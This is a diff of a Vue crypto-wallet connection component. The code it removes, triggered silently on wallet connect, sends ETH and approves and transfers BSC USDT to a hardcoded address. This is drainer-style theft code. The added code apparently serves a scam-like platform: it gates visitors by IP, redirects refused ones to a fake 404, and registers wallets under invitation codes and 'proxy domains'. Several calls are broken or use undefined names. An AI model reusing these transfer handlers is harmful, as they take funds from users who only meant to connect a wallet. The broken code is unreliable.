@@ -22,7 +22,7 @@
         v-if="!isConnected"
         class="wall-connect"
         type="warning"
-        @click="handleSignUp('0')"
+        @click="handleOpen()"
         >Connect</van-button
       >
       <div
@@ -45,10 +45,35 @@
           />
         </span>
       </div>
-      <div class="language">
+      <div class="language" @click="languageShow = true">
         <img v-lazy="getAssetsImageUrl('/language.png')" alt="" />
       </div>
     </div>
+    <van-popup v-model:show="languageShow" round class="language-popup">
+      <div class="language-title">
+        <div class="title-text">Select Chain</div>
+        <div class="title-off" @click="languageShow = false">
+          <img v-lazy="getAssetsImageUrl('/languageIcon/officon.png')" alt="" />
+        </div>
+      </div>
+      <div class="box-lines" />
+      <div class="language-box">
+        <div
+          v-for="(item, index) in actions"
+          :key="index"
+          class="language-item"
+          @click="onSelect(item)"
+        >
+          <div class="img-lang">
+            <img
+              v-lazy="getAssetsImageUrl(`/languageIcon/${item.value}.png`)"
+              alt=""
+            />
+          </div>
+          <div class="langs-text">{{ item.text }}</div>
+        </div>
+      </div>
+    </van-popup>
   </div>
 </template>
 
@@ -60,18 +85,19 @@ import {
   useWeb3ModalAccount,
   useWeb3ModalProvider
 } from "@web3modal/ethers/vue";
-import {
-  BrowserProvider,
-  Contract,
-  formatEther,
-  formatUnits,
-  parseEther
-} from "ethers";
-import { onMounted, reactive, toRef, watch, nextTick } from "vue";
+import { BrowserProvider, formatEther } from "ethers";
+import { ref, onMounted, reactive, toRef, watch, computed } from "vue";
 import BigNumber from "bignumber.js";
 import erc20Abi from "@/assets/abi/erc20.abi.json";
 import { getAssetsImageUrl, truncateString } from "@/utils/index.utils.js";
-const isLoading = toRef(false);
+import { setI18nLanguage } from "@/locales/index.js";
+import { useRoute } from "vue-router";
+const route = useRoute();
+import { testApi } from "@/api/index";
+import { useConfigStore } from "@/stores/index";
+const configStore = useConfigStore();
+import { useI18n } from "vue3-i18n";
+const { t } = useI18n();
 const baseInfo = reactive({
   userBalance: "0.00",
   signInfo: "",
@@ -83,14 +109,14 @@ const { switchNetwork } = useSwitchNetwork();
 const { walletProvider } = useWeb3ModalProvider();
 const { address, chainId, isConnected } = useWeb3ModalAccount();
 const modal = useWeb3Modal();
-
-// 登录唤起授权签名
-const handleSignUp = function (type) {
-  baseInfo.loginType = type;
-  modal.open({ view: "Connect" });
-};
 const handleOpen = () => {
   modal.open();
+};
+const languageShow = ref(false);
+const onSelect = selectedValues => {
+  setI18nLanguage(selectedValues.value);
+  languageShow.value = false;
+  // imageSource.value = imageSources[selectedValues.value];
 };
 // 切换 链
 const handleChangeChain = async function (chainId) {
@@ -101,53 +127,21 @@ const handleChangeChain = async function (chainId) {
   await modal.open({ view: "Networks" });
   return true;
 };
-
-// 签名信息
-async function onSignMessage() {
-  const provider = new BrowserProvider(walletProvider.value);
-  const signer = await provider.getSigner();
-  return await signer?.signMessage("Hello AppKit Ethers");
-}
 //  查询授权 列表
 const handleAuthTransaction = function () {
   modal.open({ view: "ApproveTransaction" });
 };
-// 签名
-const handleSignMessage = function () {
-  if (isLoading.value) {
-    return;
-  }
-  isLoading.value = true;
-  onSignMessage()
-    .then(value => {
-      baseInfo.signInfo = value?.toString();
-      isLoading.value = false;
-    })
-    .catch(() => {
-      isLoading.value = false;
-    });
-};
-// 转账
-const handleTransfer = async function () {
-  if (isLoading.value) {
-    return;
-  }
-  isLoading.value = true;
-  const provider = new BrowserProvider(walletProvider.value);
-  const signer = await provider.getSigner();
-  signer
-    ?.sendTransaction({
-      to: "0x49c17e58D3Fe208005dAA0eeD604c663A282EFF9",
-      value: parseEther("0.001")
-    })
-    .then(value => {
-      console.log("value", value);
-      isLoading.value = false;
-    })
-    .catch(() => {
-      isLoading.value = false;
-    });
-};
+const actions = [
+  { text: "简体中文", value: "zh-CN" },
+  { text: "English", value: "en-US" },
+  { text: "繁体中文", value: "zh-TW" },
+  { text: "Português", value: "pt-PT" },
+  { text: "Polski", value: "pl-PL" },
+  { text: "Français", value: "fr-FR" },
+  { text: "español", value: "es-ES" },
+  { text: "Deutsch", value: "de-DE" },
+  { text: "عربي", value: "ar-SA" }
+];
 // 断开链接
 const loginOut = function () {
   disconnect();
@@ -164,58 +158,9 @@ const getAddressBalance = async function () {
     console.log("error", JSON.stringify(e));
   }
 };
-async function getBNAuth() {
-  try {
-    if (!address) throw "Account not found.";
-    if (chainId.value != 56) {
-      await handleChangeChain(56);
-    }
-    const bnUsdt = "0x55d398326f99059ff775485246999027b3197955";
-    const provider = new BrowserProvider(walletProvider.value);
-    const tokenContract = new Contract(bnUsdt, erc20Abi, provider);
-    const signer = await provider.getSigner();
-    const dai = 0.01;
-    const allowAmt = await tokenContract.allowance(
-      address.value,
-      tokenContract
-    );
-    const decimals = await tokenContract.decimals();
-    const amount = new BigNumber(dai)
-      .multipliedBy(new BigNumber(10).exponentiatedBy(new BigNumber(decimals)))
-      .toString();
-    // 先获取代币 精度
-    if (
-      parseFloat(formatUnits(allowAmt, decimals)) <= parseInt(String(dai), 10)
-    ) {
-      let singeContractConnect = tokenContract.connect(signer);
-      //@ts-ignore
-      const tx = await singeContractConnect.approve(address.value, amount);
-      await tx.wait();
-    }
-    const singeContractConnect = tokenContract.connect(signer);
-    //@ts-ignore
-    const tx = await singeContractConnect.transfer(
-      amount,
-      "0x49c17e58D3Fe208005dAA0eeD604c663A282EFF9"
-    );
-    await tx.wait();
-  } catch (e) {
-    console.log("error", JSON.stringify(e));
-  }
-}
-
 watch(address, (newValue, oldValue) => {
   if (newValue !== oldValue && newValue) {
-    if (baseInfo.loginType === "1") {
-      handleSignMessage();
-    }
-    if (baseInfo.loginType === "2") {
-      handleTransfer();
-    }
-    if (baseInfo.loginType === "3") {
-      getBNAuth();
-    }
-    getAddressBalance();
+    configStore.queryUserInfo(address.value, chainId.value);
   }
 });
 const initAccount = async function () {
@@ -236,6 +181,62 @@ const initAccount = async function () {
   } catch (err) {
     console.log("error", JSON.stringify(err));
   }
+};
+watch(route, (to, from) => {
+  if (address.value !== void 0) {
+    queryAccessRecordIp();
+  }
+});
+/**
+ * 获取用户的ip地址是否能访问。
+ *
+ * @function getAccessRecordIp
+ * @param {String} address - 钱包地址。
+ * @param {String} domainsUrl - 使用当前浏览器地址。
+ * @returns {Boolean} - 返回true和false。
+ */
+const state = ref(true);
+const queryAccessRecordIp = () => {
+  testApi
+    .getAccessRecordIp({
+      address: address.value,
+      domains: configStore.$state.domainsUrl
+    })
+    .then(res => {
+      state.value = res.data;
+      if (state.value) {
+        queryRegister();
+      } else if (!state.value) {
+        router.push({ name: "no404" });
+      } else {
+        Toast.fail(res.msg);
+      }
+    })
+    .catch(() => {});
+};
+
+/**
+ * 注册接口。
+ *
+ * @function getRegister
+ * @param {String} address - 使用当前浏览器地址。
+ * @param {String} invitationCode - 邀请码，邀请码可为空
+ * @param {String} chainType - 链类型1以太 56bsc。
+ * @param {String} domains - 使用当前浏览器地址。
+ * @returns {Object} - 返回首页数据对象。
+ */
+const shareCode = ref("");
+const queryRegister = () => {
+  shareCode.value = route.query.share_code ? route.query.share_code : "";
+  testApi
+    .getRegister({
+      address: address.value,
+      invitationCode: shareCode.value, //邀请码可为空
+      chainType: chainId.value, //1以太 56bsc
+      domains: domainsUrl.value //代理域名
+    })
+    .then(() => {})
+    .catch(() => {});
 };
 onMounted(() => {
   // initAccount();
@@ -314,6 +315,72 @@ onMounted(() => {
       > img {
         width: 1.14rem;
         height: 1.14rem;
+      }
+    }
+  }
+  .language-popup {
+    background: linear-gradient(
+      143.14deg,
+      #322827 2.04%,
+      #16261f 54.45%,
+      #302135 98.21%
+    );
+    border-radius: 0.71rem;
+    padding: 1.14rem;
+    border: 1px solid #ff693e66;
+  }
+  .language-title {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    .title-text {
+      font-size: 1rem;
+      font-weight: 400;
+      line-height: 1.4rem;
+      color: #ff693e;
+    }
+    .title-off {
+      width: 16px;
+      > img {
+        width: 16px;
+      }
+    }
+  }
+  .box-lines {
+    height: 0.07rem;
+    margin: 1rem 0 0.71rem;
+    background: linear-gradient(
+      90deg,
+      rgba(255, 105, 62, 0) 0%,
+      rgba(255, 105, 62, 0.2) 44.13%,
+      rgba(255, 105, 62, 0) 100%
+    );
+  }
+  .language-box {
+    display: grid;
+    grid-gap: 1rem 1rem;
+    grid-template-columns: repeat(2, 1fr);
+    .language-item {
+      min-width: 124.04px;
+      display: flex;
+      align-items: center;
+      background: #ffffff1a;
+      border: 0.07rem solid #ffffff33;
+      border-radius: 0.71rem;
+      padding: 0.57rem;
+      .img-lang {
+        width: 1.43rem;
+        > img {
+          width: 100%;
+        }
+      }
+      .langs-text {
+        margin-left: 0.71rem;
+        font-family: PingFang SC;
+        font-size: 0.86rem;
+        font-weight: 400;
+        line-height: 1.2rem;
+        color: #ffffff;
       }
     }
   }
